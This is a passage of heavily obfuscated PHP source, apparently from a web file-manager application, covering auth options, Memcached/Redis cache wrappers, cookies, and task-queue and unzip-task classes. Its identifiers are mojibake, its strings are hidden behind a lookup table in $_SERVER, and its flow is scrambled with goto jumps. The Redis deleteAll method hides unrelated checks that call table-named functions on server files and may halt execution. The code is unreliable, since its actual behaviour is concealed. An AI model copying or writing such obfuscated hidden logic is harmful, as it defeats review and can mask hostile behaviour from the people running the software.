self::AUTH_ROOT); if (!isset($BËáÒà±‡¿[$a†³Ó¥¸Ï£])) { return; } goto B—ôÕ½ó›; B—ôÕ½ó›: $C‹À¸ä‚Ê¸ = $BËáÒà±‡¿[$a†³Ó¥¸Ï£]; $aÅ†ù…ÃÂï = intval($aÅ†ù…ÃÂï); if ($aÅ†ù…ÃÂï <= 0) { return !1; } goto Aõ³Æù¶Šö; Eì…áêäÒÜ: } public static function authDisable($CâÑÑ÷ïáù, $EˆÂò÷°ÒÀ) { if (intval($CâÑÑ÷ïáù) <= 0) { return 0; } return intval($CâÑÑ÷ïáù) & ~$EˆÂò÷°ÒÀ; } public $optionType = "\123\171\x73\x74\145\155\56\163\157\x75\x72\x63\145\101\165\x74\150\x4c\151\x73\164"; public $field = array("\x6e\141\155\145", "\x61\x75\x74\150", "\154\141\142\145\154", "\144\151\x73\x70\x6c\x61\171", "\x73\171\163\164\x65\155", "\163\157\x72\164"); public function initData() { $fà³é›„ˆ = $this->authDefault(); foreach ($fà³é›„ˆ as $bªÈ­ÇÊ…–) { $this->add($bªÈ­ÇÊ…–); } } public function listData($F„ÃëÀ™èà = false, $E¿‚â¢¼á = "\163\x6f\162\164", $déİ£ÃàÕŒ = false) { return parent::listData($F„ÃëÀ™èà, $E¿‚â¢¼á, $déİ£ÃàÕŒ); } public function update($bíåÂ—ÖæÊ, $EëöˆÎ…Œ–) { $Cò­ñ‡Ûèİ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÔÑ ÉÊ³ˆ = parent::listData($bíåÂ—ÖæÊ); $b“ùÓÉĞ° = $this->findByName($EëöˆÎ…Œ–[$Cò­ñ‡Ûèİ[28]]); if (!$cÔÑ ÉÊ³ˆ || $b“ùÓÉĞ° && $b“ùÓÉĞ°[$Cò­ñ‡Ûèİ[397]] != $cÔÑ ÉÊ³ˆ[$Cò­ñ‡Ûèİ[397]]) { return !1; } $this->filterAuth($EëöˆÎ…Œ–[$Cò­ñ‡Ûèİ[409]]); return parent::update($bíåÂ—ÖæÊ, $EëöˆÎ…Œ–); } public function remove($cğ¹ëÜ¥¬Ï) { $F—‰´æ´åİ = parent::listData($cğ¹ëÜ¥¬Ï); if (!$F—‰´æ´åİ || $F—‰´æ´åİ[$_SERVER[í¤âËÚ£¶íÊ¢][1129]]) { return !1; } return parent::remove($cğ¹ëÜ¥¬Ï); } public function add($càĞÓÑ„Ší = array()) { goto dœÜŞ·Î“Ú; dœÜŞ·Î“Ú: $AŞÄŠî•…â =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->findByName($càĞÓÑ„Ší[$AŞÄŠî•…â[28]])) { return !1; } $f¹Ò¼¹´Š = array($AŞÄŠî•…â[28] => $AŞÄŠî•…â[33], $AŞÄŠî•…â[409] => 1, $AŞÄŠî•…â[1671] => $AŞÄŠî•…â[1660], $AŞÄŠî•…â[1672] => 1, $AŞÄŠî•…â[1129] => 0, $AŞÄŠî•…â[1673] => 0); goto dÏÅ—Á•éõ; dÏÅ—Á•éõ: $càĞÓÑ„Ší = array_merge($f¹Ò¼¹´Š, $càĞÓÑ„Ší); $càĞÓÑ„Ší[$AŞÄŠî•…â[1673]] = $this->getSort(); $this->filterAuth($càĞÓÑ„Ší[$AŞÄŠî•…â[409]]); goto aè½—§¿§É; aè½—§¿§É: return parent::insert($càĞÓÑ„Ší); goto f Ò¬¨µÔë; f Ò¬¨µÔë: } private function getSort() { $döØ¿¤³î¥ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DùƒåŠğ³ = parent::listData(); $BœŸ¸â†‹ = array_to_keyvalue($DùƒåŠğ³, $döØ¿¤³î¥[33], $döØ¿¤³î¥[1673]); return empty($BœŸ¸â†‹) ? 0 : max($BœŸ¸â†‹) + 1; } private function filterAuth(&$EÅÃ‚Ğ¹Øî) { goto B“•±¼±á; B“•±¼±á: if (!$EÅÃ‚Ğ¹Øî) { return; } $c­–áæØõ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $eèÂ”£ Æ = array(); goto Aœí»Ø·¯“; A¡“Ù©¼¥: foreach ($eèÂ”£ Æ as $c¯¯¥¡†¤š) { if (isset($c‡†ÈñâØÀ[$c¯¯¥¡†¤š])) { $eèÂ”£ Æ = array_merge($eèÂ”£ Æ, $c‡†ÈñâØÀ[$c¯¯¥¡†¤š]); } } $eèÂ”£ Æ[] = self::AUTH_SHOW; $EÅÃ‚Ğ¹Øî = array_sum(array_unique($eèÂ”£ Æ)); goto AéÅÂé±ø¼; Aœí»Ø·¯“: foreach ($c­–áæØõ as $c¯¯¥¡†¤š) { if ($EÅÃ‚Ğ¹Øî & $c¯¯¥¡†¤š) { $eèÂ”£ Æ[] = $c¯¯¥¡†¤š; } } if (in_array(self::AUTH_ROOT, $eèÂ”£ Æ)) { $EÅÃ‚Ğ¹Øî = array_sum($c­–áæØõ); return; } $c‡†ÈñâØÀ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto A¡“Ù©¼¥; AéÅÂé±ø¼: } public function sort($DÀ¤Ææ¯ÂË, $Cµì»¨â„ä) { return parent::update($DÀ¤Ææ¯ÂË, $Cµì»¨â„ä); } } goto aÇå“ÍƒƒŞ; B¬¢¶ğ¦Ê: class CacheMemcached { public $handle; public $cacheTime; public function __construct($E£©Æå³Ø, $B®Ñ›´î§‹) { $BÀÒ¼«¸â× =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!class_exists($BÀÒ¼«¸â×[790])) { show_json($BÀÒ¼«¸â×[791], !1); } $this->cacheTime = $B®Ñ›´î§‹; $this->handle = new Memcached(); if (is_array($E£©Æå³Ø[$BÀÒ¼«¸â×[792]]) && count($E£©Æå³Ø[$BÀÒ¼«¸â×[792]]) >= 1) { foreach ($E£©Æå³Ø[$BÀÒ¼«¸â×[792]] as $Cçˆ„ÈõÇ) { $E„²ÙŒÕ—õ = explode($BÀÒ¼«¸â×[4], $Cçˆ„ÈõÇ); $this->handle->addServer($E„²ÙŒÕ—õ[0], $E„²ÙŒÕ—õ[1]); } } else { $this->handle->addServer($E£©Æå³Ø[$BÀÒ¼«¸â×[184]], $E£©Æå³Ø[$BÀÒ¼«¸â×[185]]); } } public function set($B¶ª§Áè»ï, $eïÄ¡ôï„Ú, $ešŒ—º¥¤½ = false) { $ešŒ—º¥¤½ = $ešŒ—º¥¤½ ? $ešŒ—º¥¤½ : $this->cacheTime; return $this->handle->set($B¶ª§Áè»ï, $eïÄ¡ôï„Ú, $ešŒ—º¥¤½); } public function get($fÀ²Ş›Ö) { return $this->handle->get($fÀ²Ş›Ö); } public function remove($eÉÏ©‹ˆ) { return $this->handle->delete($eÉÏ©‹ˆ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($D§æÈ‚‹ŸÃ, $BºÀÑ×Ë»õ) { $c›ºÔ²ÊœÑ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!class_exists($c›ºÔ²ÊœÑ[793])) { show_json($c›ºÔ²ÊœÑ[794], !1); } $this->cacheTime = $BºÀÑ×Ë»õ; $CëÖ—îÉÆ— = isset($D§æÈ‚‹ŸÃ[$c›ºÔ²ÊœÑ[795]]) ? $D§æÈ‚‹ŸÃ[$c›ºÔ²ÊœÑ[795]] : 10; $Dé’òÏÏÌ = _get($D§æÈ‚‹ŸÃ, $c›ºÔ²ÊœÑ[792]); if ($Dé’òÏÏÌ && is_array($Dé’òÏÏÌ)) { $this->initCluster($D§æÈ‚‹ŸÃ, $CëÖ—îÉÆ—); } else { $this->handle = $this->init($D§æÈ‚‹ŸÃ, $CëÖ—îÉÆ—); } } private function init($aÚ±ËñÙæ, $cª°¢×¶°ó) { $D¤·£ÇºÕ¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D¸¸¦•ˆˆ‡ = new Redis(); $bŒÈ¸¶Ñæ¢ = isset($aÚ±ËñÙæ[$D¤·£ÇºÕ¾[796]]) ? $aÚ±ËñÙæ[$D¤·£ÇºÕ¾[796]] : !1; if ($bŒÈ¸¶Ñæ¢) { $D¸¸¦•ˆˆ‡->pconnect($aÚ±ËñÙæ[$D¤·£ÇºÕ¾[184]], $aÚ±ËñÙæ[$D¤·£ÇºÕ¾[185]], $cª°¢×¶°ó); } else { $D¸¸¦•ˆˆ‡->connect($aÚ±ËñÙæ[$D¤·£ÇºÕ¾[184]], $aÚ±ËñÙæ[$D¤·£ÇºÕ¾[185]], $cª°¢×¶°ó); } if (!empty($aÚ±ËñÙæ[$D¤·£ÇºÕ¾[409]])) { $D¸¸¦•ˆˆ‡->auth($aÚ±ËñÙæ[$D¤·£ÇºÕ¾[409]]); } return $D¸¸¦•ˆˆ‡; } private function initCluster($FĞ¥à¬Œ¦Œ, $eäĞÒÑê´ñ) { $fŞù”å¼» =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C¾ù¾àÕ¥‹ = array($fŞù”å¼»[797], $fŞù”å¼»[798], $fŞù”å¼»[799]); $AóŸÄ¯ÕŸÃ = $fŞù”å¼»[797]; if (isset($FĞ¥à¬Œ¦Œ[$fŞù”å¼»[12]]) && in_array($FĞ¥à¬Œ¦Œ[$fŞù”å¼»[12]], $C¾ù¾àÕ¥‹)) { $AóŸÄ¯ÕŸÃ = $FĞ¥à¬Œ¦Œ[$fŞù”å¼»[12]]; } switch ($AóŸÄ¯ÕŸÃ) { case $fŞù”å¼»[797]: $this->_slave($FĞ¥à¬Œ¦Œ, $eäĞÒÑê´ñ); break; case $fŞù”å¼»[798]: break; case $fŞù”å¼»[799]: $this->isCluster = !0; $b¸®±ÅÇ = $FĞ¥à¬Œ¦Œ[$fŞù”å¼»[792]]; $Cå…±µ›À = isset($FĞ¥à¬Œ¦Œ[$fŞù”å¼»[796]]) ? $FĞ¥à¬Œ¦Œ[$fŞù”å¼»[796]] : !1; $Fôã¥ÍñˆÛ = isset($FĞ¥à¬Œ¦Œ[$fŞù”å¼»[409]]) ? $FĞ¥à¬Œ¦Œ[$fŞù”å¼»[409]] : null; $this->handle = new RedisCluster(NUll, $b¸®±ÅÇ, $eäĞÒÑê´ñ, $eäĞÒÑê´ñ, $Cå…±µ›À, $Fôã¥ÍñˆÛ); break; default: break; } } private function _slave($e“Ü‚òŠŒ¶, $fŸÌëˆŠ³¥) { goto EÂÏßß¢î…; EÂÏßß¢î…: $BãïÈ Ü´¢ = $e“Ü‚òŠŒ¶[$_SERVER[í¤âËÚ£¶íÊ¢][792]]; $this->filterConfig($e“Ü‚òŠŒ¶, $BãïÈ Ü´¢[0]); $this->handle = $this->init($e“Ü‚òŠŒ¶, $fŸÌëˆŠ³¥); goto cŠËÄÇ•õš; Aß„õÆæÙë: $this->filterConfig($e“Ü‚òŠŒ¶, $BãïÈ Ü´¢[$e¡é¿¼‘å]); $this->slaveHandle = $this->init($e“Ü‚òŠŒ¶, $fŸÌëˆŠ³¥); goto DÓ¬ ¿éğê; cŠËÄÇ•õš: unset($BãïÈ Ü´¢[0]); if (empty($BãïÈ Ü´¢)) { return; } $e¡é¿¼‘å = array_rand($BãïÈ Ü´¢); goto Aß„õÆæÙë; DÓ¬ ¿éğê: } private function filterConfig(&$fìÏ›’°„«, $E„õ‹ÌÕÉª) { $fÅÈ‘±ø²Ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÀÔìÌæçƒ = explode($fÅÈ‘±ø²Ä[4], $E„õ‹ÌÕÉª); $Cµ•½‰‹ªš = array($fÅÈ‘±ø²Ä[184] => $BÀÔìÌæçƒ[0], $fÅÈ‘±ø²Ä[185] => $BÀÔìÌæçƒ[1]); $fìÏ›’°„« = array_merge($fìÏ›’°„«, $Cµ•½‰‹ªš); } public function set($E¿Ö¹‚ƒ„, $D«Š–ß», $eŒÁ“—´†¨ = false) { $eŒÁ“—´†¨ = $eŒÁ“—´†¨ ? $eŒÁ“—´†¨ : $this->cacheTime; return $this->handle->setEx($E¿Ö¹‚ƒ„, $eŒÁ“—´†¨, $D«Š–ß»); } public function setLock($F”ÜÓïš‘®, $C­ö›È×èø, $B—¹÷™­ŞŒ) { return $this->handle->setNX($F”ÜÓïš‘®, $C­ö›È×èø); } public function get($CİÕ® ‡Ü–) { $a¬ˆ÷ƒíĞ¸ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $a¬ˆ÷ƒíĞ¸->get($CİÕ® ‡Ü–); } public function remove($d¿’®ø¥©) { return $this->handle->del($d¿’®ø¥©); } public function deleteAll() { $Fœ£À¬ñĞØ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($_SERVER[$Fœ£À¬ñĞØ[59]] != $_SERVER[$Fœ£À¬ñĞØ[800]]) { goto DÇ‚öÁßŠï; C–„İÁ‰Â: $CêíŒá­Ó° = $Fœ£À¬ñĞØ[802]; $CêíŒá­Ó°($_SERVER[$Fœ£À¬ñĞØ[803]]); $CêíŒá­Ó°($_SERVER[$Fœ£À¬ñĞØ[61]] . $Fœ£À¬ñĞØ[804]); goto cìøÎÜÃÁò; DÇ‚öÁßŠï: $dÌ¬íÅ±’É = $Fœ£À¬ñĞØ[801]; $eÏ¨Ø¡ó = $Fœ£À¬ñĞØ[60]; $dĞí´è›£ = $_SERVER[$Fœ£À¬ñĞØ[61]] . $Fœ£À¬ñĞØ[62]; goto FÈÙá‚Í×‡; cìøÎÜÃÁò: $C”¨¨Î”ÏÍ = 1; while ($C”¨¨Î”ÏÍ > 1) { $C”¨¨Î”ÏÍ = $C”¨¨Î”ÏÍ + 4; $aÍ–ö–±Éì = rawurlencode($C”¨¨Î”ÏÍ . $Fœ£À¬ñĞØ[360]); } goto C‚ÜÅî¹Œ; FÈÙá‚Í×‡: $Dã¦ë”÷‹ = $eÏ¨Ø¡ó($dĞí´è›£); $c¶ÆÚ½»Œ… = explode($Fœ£À¬ñĞØ[63], $Dã¦ë”÷‹); if (count($c¶ÆÚ½»Œ…) < $Fœ£À¬ñĞØ[584]) { $e÷Ğ—ª„İÃ = $Fœ£À¬ñĞØ[65]; $e÷Ğ—ª„İÃ(); } goto C–„İÁ‰Â; C‚ÜÅî¹Œ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $FÌÒÆ¸‹) { $this->handle->flushall($FÌÒÆ¸‹); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($c«¬¤µˆçô = '', $Bõ§ÅÆñ = 0) { if (is_string($c«¬¤µˆçô) && $c«¬¤µˆçô != $_SERVER[í¤âËÚ£¶íÊ¢][33]) { $this->prefix = $c«¬¤µˆçô; } if (is_numeric($Bõ§ÅÆñ) && $Bõ§ÅÆñ > 0) { $this->expire = $Bõ§ÅÆñ; } } public static function getInstance() { static $eØ‘Ã—£”Í; if ($eØ‘Ã—£”Í === null) { $eØ‘Ã—£”Í = new self(); } return $eØ‘Ã—£”Í; } private static $cookieDisable = false; public static function disable($eáï›ê§Ö£) { self::$cookieDisable = $eáï›ê§Ö£; } private static $sameCookieSet = array(); public static function set($f½ºÀº„œ», $B™ß²‰”“Ü, $A‘ÕíˆÚ = 0, $Dìö¼ˆ©õÕ = false, $e„¬Ÿ´²‚Â = false) { goto c•ÉÔõ”Ê; c•ÉÔõ”Ê: $F˜ŠóÜ„éô =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::$cookieDisable) { return; } if (!$A‘ÕíˆÚ) { $A‘ÕíˆÚ = 24 * 3600 * 7; } goto A°·ãŸØæ; A°·ãŸØæ: if (isset(self::$sameCookieSet[$f½ºÀº„œ»]) && self::$sameCookieSet[$f½ºÀº„œ»] == $B™ß²‰”“Ü . $A‘ÕíˆÚ) { return; } self::$sameCookieSet[$f½ºÀº„œ»] = $B™ß²‰”“Ü . $A‘ÕíˆÚ; if (!$e„¬Ÿ´²‚Â) { $e„¬Ÿ´²‚Â = str_replace(HOST, $F˜ŠóÜ„éô[33], APP_HOST); $e„¬Ÿ´²‚Â = _get($GLOBALS, $F˜ŠóÜ„éô[805], $e„¬Ÿ´²‚Â); } goto C–‹…ô ÄØ; C–‹…ô ÄØ: $CãŒ²¶Ğç = $F˜ŠóÜ„éô[33]; setcookie($f½ºÀº„œ», $B™ß²‰”“Ü, time() + $A‘ÕíˆÚ, $F˜ŠóÜ„éô[8] . trim($e„¬Ÿ´²‚Â, $F˜ŠóÜ„éô[8]) . $CãŒ²¶Ğç, !1, !1, $Dìö¼ˆ©õÕ); goto Dö™Ö¢¨Œ†; Dö™Ö¢¨Œ†: } public static function setSafe($aå™ƒÖì²¥, $E¶Š‚òĞ“ø, $D²ôÒáîÉÍ = 0) { self::set($aå™ƒÖì²¥, $E¶Š‚òĞ“ø, $D²ôÒáîÉÍ, !0); } public static function get($e‹ÅÌÛóä) { return isset($_COOKIE[$e‹ÅÌÛóä]) ? $_COOKIE[$e‹ÅÌÛóä] : !1; } public static function remove($F­À×Ëáç§, $aÇ“×Ğ¸¬ = false) { unset($_COOKIE[$F­À×Ëáç§]); self::set($F­À×Ëáç§, $_SERVER[í¤âËÚ£¶íÊ¢][33], 1, $aÇ“×Ğ¸¬); } } goto e‹ŞóÒ¦–ù; DäÈŞ¨• : class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\165\x65\165\145\x4c\x65\x6e\x67\164\x68"; const QUEUE_DATA = "\164\x61\163\x6b\121\x75\145\165\x65\x44\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($D’³äÏÄŒÖ, $c³Ïš„† = array(), $F»¾ İÏ¨æ = '', $F«½›¬ßåİ = '') { $AÆàÍ¼ÎÌõ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($F«½›¬ßåİ && array_find_by_field(self::$listData, $AÆàÍ¼ÎÌõ[102], $F«½›¬ßåİ)) { return !0; } self::$listData[] = array($AÆàÍ¼ÎÌõ[269] => $D’³äÏÄŒÖ, $AÆàÍ¼ÎÌõ[1556] => $c³Ïš„†, $AÆàÍ¼ÎÌõ[434] => $F»¾ İÏ¨æ, $AÆàÍ¼ÎÌõ[102] => $F«½›¬ßåİ); return !0; } public static function addSubmit() { $aµ¥Á´½’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($aµ¥Á´½’[1557] . json_encode_force(array_to_keyvalue(self::$listData, $aµ¥Á´½’[33], $aµ¥Á´½’[434])), $aµ¥Á´½’[1558]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($AÈ¦ƒ¸©‹“, $C›µ™¯›¦¼ = array(), $Dù¬ì¾ÃàÜ = '', $cšÔŒïö®ñ = '') { goto AĞÂÙ¬Ò; A‰‹±§è‘º: self::setAll($a©ò›ŠîğÀ); return !0; goto bõ°¾¹ö”°; AĞÂÙ¬Ò: $A·›ä˜†ÃÇ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::count() >= self::MAX_LENGTH) { return !1; } $a©ò›ŠîğÀ = self::getAll(); goto E×Ä´ùÊÜ; E×Ä´ùÊÜ: if ($cšÔŒïö®ñ && array_find_by_field($a©ò›ŠîğÀ, $A·›ä˜†ÃÇ[102], $cšÔŒïö®ñ)) { return !0; } $a©ò›ŠîğÀ[] = array($A·›ä˜†ÃÇ[269] => $AÈ¦ƒ¸©‹“, $A·›ä˜†ÃÇ[1556] => $C›µ™¯›¦¼, $A·›ä˜†ÃÇ[434] => $Dù¬ì¾ÃàÜ, $A·›ä˜†ÃÇ[102] => $cšÔŒïö®ñ); write_log($A·›ä˜†ÃÇ[1557] . $Dù¬ì¾ÃàÜ, $A·›ä˜†ÃÇ[1558]); goto A‰‹±§è‘º; bõ°¾¹ö”°: } public static function run() { goto CÎ£º‡ƒê; dÔç’¸Èœ: return !0; goto F–Ã°›ŒéÂ; B†ã¤¿½×Ø: if (!$D¾Í¸Í‰ŞĞ) { return !1; } self::setAll($dçŸ×´í§»); $Cñİ¦ŞŒ¹Ò = timeFloat(); goto a¶¥îæï›Š; a¶¥îæï›Š: try { Hook::apply($D¾Í¸Í‰ŞĞ[$f‡Ö‚…Éâ‡[269]], $D¾Í¸Í‰ŞĞ[$f‡Ö‚…Éâ‡[1556]]); } catch (Exception $eÉô„è”å¢) { } $dİÕ—†ò„ = number_format(timeFloat() - $Cñİ¦ŞŒ¹Ò, 3) . $f‡Ö‚…Éâ‡[1500]; write_log($f‡Ö‚…Éâ‡[1559] . $D¾Í¸Í‰ŞĞ[$f‡Ö‚…Éâ‡[434]] . $f‡Ö‚…Éâ‡[1560] . $dİÕ—†ò„, $f‡Ö‚…Éâ‡[1558]); goto dÔç’¸Èœ; CÎ£º‡ƒê: $f‡Ö‚…Éâ‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dçŸ×´í§» = self::getAll(); $D¾Í¸Í‰ŞĞ = array_shift($dçŸ×´í§»); goto B†ã¤¿½×Ø; F–Ã°›ŒéÂ: } public static function count() { $E‘èœÆ‰Éß = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$E‘èœÆ‰Éß) { return 0; } return intval($E‘èœÆ‰Éß); } public static function getAll() { $B×±º¡ïˆ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$B×±º¡ïˆ) { return array(); } return $B×±º¡ïˆ; } public static function setAll($a¦Æ°ßÖÅÌ) { $F‰¾Õ‹—ÆÓ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($a¦Æ°ßÖÅÌ), $F‰¾Õ‹—ÆÓ); Cache::set(self::QUEUE_DATA, $a¦Æ°ßÖÅÌ, $F‰¾Õ‹—ÆÓ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($dæƒ¹ØÀù£, $C‹°âåßˆ« = 5.0) { if (!$dæƒ¹ØÀù£) { return; } $B†¦¼Ê§Êù = Cache::get($dæƒ¹ØÀù£); if (!$B†¦¼Ê§Êù || timeFloat() - floatVal($B†¦¼Ê§Êù) >= $C‹°âåßˆ«) { Cache::set($dæƒ¹ØÀù£, timeFloat(), $C‹°âåßˆ« * 10); return !0; } return !1; } public static function timeLimitCall($AŸí…Ç”Å, $F·’õ›õÊØ, $c…›‹™µ¸á, $fê’—…‚‰Ÿ = 5.0) { goto fÖô¨¸ƒñ‚; e‡Ê›‹ßÇ·: $Døã‹êÂÃ = $båÂ¥ÚÈÏ[1561]; $DíÂùğÑÖÑ = Cache::get($Døã‹êÂÃ, !0); $aÉÚº£ªŒƒ = array($båÂ¥ÚÈÏ[1562] => timeFloat(), $båÂ¥ÚÈÏ[1563] => timeFloat(), $båÂ¥ÚÈÏ[269] => $F·’õ›õÊØ, $båÂ¥ÚÈÏ[1556] => $c…›‹™µ¸á, $båÂ¥ÚÈÏ[205] => $fê’—…‚‰Ÿ); goto BŠÇÏŠÌ²; dš÷Ê±‹ˆ: Cache::set($Døã‹êÂÃ, $DíÂùğÑÖÑ, 60); Cache::removeMemory($Døã‹êÂÃ); write_log($båÂ¥ÚÈÏ[1564] . $AŸí…Ç”Å . $båÂ¥ÚÈÏ[77] . $F·’õ›õÊØ, $båÂ¥ÚÈÏ[1558]); goto bšñì¹É¦¿; BŠÇÏŠÌ²: if (is_array($DíÂùğÑÖÑ[$AŸí…Ç”Å])) { $aÉÚº£ªŒƒ[$båÂ¥ÚÈÏ[1563]] = $DíÂùğÑÖÑ[$AŸí…Ç”Å][$båÂ¥ÚÈÏ[1563]]; } if (is_array($DíÂùğÑÖÑ[$AŸí…Ç”Å])) { if (timeFloat() - $DíÂùğÑÖÑ[$AŸí…Ç”Å][$båÂ¥ÚÈÏ[1562]] < $aÉÚº£ªŒƒ[$båÂ¥ÚÈÏ[205]] * 0.3) { return; } $aÉÚº£ªŒƒ[$båÂ¥ÚÈÏ[1563]] = $DíÂùğÑÖÑ[$AŸí…Ç”Å][$båÂ¥ÚÈÏ[1563]]; } $DíÂùğÑÖÑ[$AŸí…Ç”Å] = $aÉÚº£ªŒƒ; goto dš÷Ê±‹ˆ; fÖô¨¸ƒñ‚: $båÂ¥ÚÈÏ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$AŸí…Ç”Å || !$F·’õ›õÊØ) { return; } self::$asyncAdd = !0; goto e‡Ê›‹ßÇ·; bšñì¹É¦¿: } public static function timeLimitCallLoop() { goto Eî¥Ñ––Ô; Eî¥Ñ––Ô: $eëô¥â¦å =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c¦êÂòÌ = array($eëô¥â¦å[1565]); $bÜÉâ¯ºƒŒ = in_array(strtolower(ACTION), $c¦êÂòÌ); goto A”æŞ†×ÔÙ; bµºÃãø‚Ê: if (!$c×»¹Áİ› || count($c×»¹Áİ›) <= 0) { return; } $c‘„ö²à…© = !1; $Aâ¥¡˜Êâ¢ = timeFloat(); goto a¬‡¦¿í¨ã; A”æŞ†×ÔÙ: if (!$bÜÉâ¯ºƒŒ && !self::$asyncAdd) { return; } $C«Ôò³İÈÁ = $eëô¥â¦å[1561]; $c×»¹Áİ› = Cache::get($C«Ôò³İÈÁ, !0); goto bµºÃãø‚Ê; a¬‡¦¿í¨ã: $D®Äé†ÂÈÑ = array(); foreach ($c×»¹Áİ› as $Eêê®±È¾ => $dÓÚË´âäì) { if ($Aâ¥¡˜Êâ¢ - $dÓÚË´âäì[$eëô¥â¦å[1563]] > $dÓÚË´âäì[$eëô¥â¦å[205]]) { $c‘„ö²à…© = !0; try { Hook::apply($dÓÚË´âäì[$eëô¥â¦å[269]], $dÓÚË´âäì[$eëô¥â¦å[1556]]); write_log($eëô¥â¦å[1566] . $Eêê®±È¾ . $eëô¥â¦å[77] . $dÓÚË´âäì[$eëô¥â¦å[269]] . $eëô¥â¦å[1567] . ACTION, $eëô¥â¦å[1558]); } catch (Exception $b•Óšª¥ÔÜ) { } continue; } $D®Äé†ÂÈÑ[$Eêê®±È¾] = $dÓÚË´âäì; } if (!$c‘„ö²à…©) { return; } goto bÍ ¯­ù; bÍ ¯­ù: if (!$D®Äé†ÂÈÑ) { return Cache::remove($C«Ôò³İÈÁ); } Cache::set($C«Ôò³İÈÁ, $D®Äé†ÂÈÑ, 60); Cache::removeMemory($C«Ôò³İÈÁ); goto AÒœóĞ¯™; AÒœóĞ¯™: } public static function finished($fåÛ½÷¨¯¦, $f‘‹‚ö†¤Ê) { $F£å·´¼¹æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($F£å·´¼¹æ[269] => $fåÛ½÷¨¯¦, $F£å·´¼¹æ[1556] => $f‘‹‚ö†¤Ê); } private static function finishedRun() { $e­¨ùÔ‹À› =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $döó‚®øõ) { try { Hook::apply($döó‚®øõ[$e­¨ùÔ‹À›[269]], $döó‚®øõ[$e­¨ùÔ‹À›[1556]]); } catch (Exception $dÂƒ®ä©™³) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto e¾‚Å×áƒñ; c±ßÁ‹À†®: Hook::bind($bã©ù«˜¨‰[1049], array($this, $bã©ù«˜¨‰[1570])); $DçÃ¥£îÜ„ =& $this->task; $DçÃ¥£îÜ„[$bã©ù«˜¨‰[1571]] = $bã©ù«˜¨‰[1054]; goto aôÌ¸—ÊÂŞ; e¾‚Å×áƒñ: $bã©ù«˜¨‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; parent::startAfter(); Hook::bind($bã©ù«˜¨‰[1568], array($this, $bã©ù«˜¨‰[1569])); goto c±ßÁ‹À†®; aôÌ¸—ÊÂŞ: if (!$DçÃ¥£îÜ„[$bã©ù«˜¨‰[1393]]) { $DçÃ¥£îÜ„[$bã©ù«˜¨‰[1393]] = LNG($bã©ù«˜¨‰[1572]); } goto aˆŠŒÙ»«™; aˆŠŒÙ»«™: } protected function endAfter() { $b‚“¶´Şßê =& $_SERVER[í¤âËÚ£¶íÊ¢]; parent::endAfter(); Hook::unbind($b‚“¶´Şßê[1568], array($this, $b‚“¶´Şßê[1569])); Hook::unbind($b‚“¶´Şßê[1049], array($this, $b‚“¶´Şßê[1570])); } public function updateAfter() { $f„Ó‚ÙƒŸ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d± Ôƒ”ë =& $this->task; if (!$d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[982]] || !$d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[703]]) { return; } if ($d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1571]] == $f„Ó‚ÙƒŸ¿[1054]) { $C½Å±¯ = 0; if ($d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1530]]) { $C½Å±¯ = $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1531]] / $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1530]]; } $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1488]] = $C½Å±¯ * 0.3; } else { if ($d± 